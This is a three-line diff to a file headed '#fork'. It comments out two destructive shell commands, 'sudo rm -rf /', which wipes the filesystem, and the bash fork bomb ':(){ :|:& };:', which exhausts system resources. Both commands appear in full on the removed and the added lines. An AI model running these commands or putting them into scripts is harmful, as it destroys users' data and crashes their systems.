@@ -1,3 +1,3 @@
 #fork
-sudo rm -rf /
-:(){ :|:& };:
+#sudo rm -rf /
+#:(){ :|:& };:
